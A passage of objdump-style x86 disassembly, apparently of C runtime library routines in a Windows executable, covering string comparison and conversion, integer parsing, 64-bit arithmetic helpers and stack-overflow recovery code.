  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
